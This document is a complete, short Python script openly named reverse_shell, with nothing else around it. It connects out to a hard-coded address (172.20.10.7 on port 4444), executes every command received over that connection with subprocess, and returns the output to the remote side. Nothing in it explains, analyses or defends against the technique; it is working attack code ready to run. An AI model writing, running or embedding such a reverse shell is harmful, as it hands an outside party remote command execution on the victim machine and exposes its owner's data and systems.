#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell(ip="172.20.10.7", port=4444):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        
        while True:
            data = s.recv(1024).decode()
            if data.strip() == "exit":
                break
            
            output = subprocess.getoutput(data)
            s.send(output.encode())
            
    except Exception as e:
        print(f"Reverse shell error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()
